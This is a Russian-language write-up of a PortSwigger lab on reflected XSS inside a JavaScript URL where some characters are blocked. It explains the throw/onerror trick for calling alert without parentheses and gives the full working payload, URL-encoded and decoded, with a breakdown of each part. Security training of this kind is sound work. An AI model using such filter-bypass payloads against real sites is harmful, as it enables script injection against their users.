# Reflected XSS in a JavaScript URL with some characters blocked

## Theory

<h3>Выход из строки JavaScript</h3>

Некоторые веб-сайты усложняют XSS, ограничивая символы, которые вам разрешено использовать. Это может быть на уровне веб-сайта или путем развертывания WAF, который предотвращает попадание ваших запросов на веб-сайт. В этих ситуациях вам нужно поэкспериментировать с другими способами вызова функций, которые обходят эти меры безопасности. Один из способов сделать это — использовать оператор throw с обработчиком исключений. Это позволяет передавать аргументы функции без использования круглых скобок. Следующий код назначает функцию alert() глобальному обработчику исключений, а инструкция throw передает 1 обработчику исключений (в данном случае alert). Конечным результатом является то, что функция alert() вызывается с 1 в качестве аргумента.
```
onerror=alert;throw 1
```

## Writeup

Главная страница:

![](./assets/1.png)

Мы будем использовать следующий экплоит для решения задания:
```
https://0a8f0052048cd6c1c072161f00e2000b.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```

Код экплоита без URL кодировки:
```
https://0a8f0052048cd6c1c072161f00e2000b.web-security-academy.net/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

**&** - добавляет новый параметр, чтобы оставить параметр postId нетронутым

**'}** - используется для того, чтобы выйти из body:'/post?postId=1'}

**\,x=x=>{throw\/\**/onerror=alert,1337},toString=x,window+'',** - перезаписывает метод toString и запускает его.

**{x:'** - используется, чтобы не нарушать JavaScript.

Получаем ответ от сервера.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/(XSS)_Cross-site_scripting/Reflected_XSS_in_a_JavaScript_URL_with_some_characters_blocked/assets/2.png)
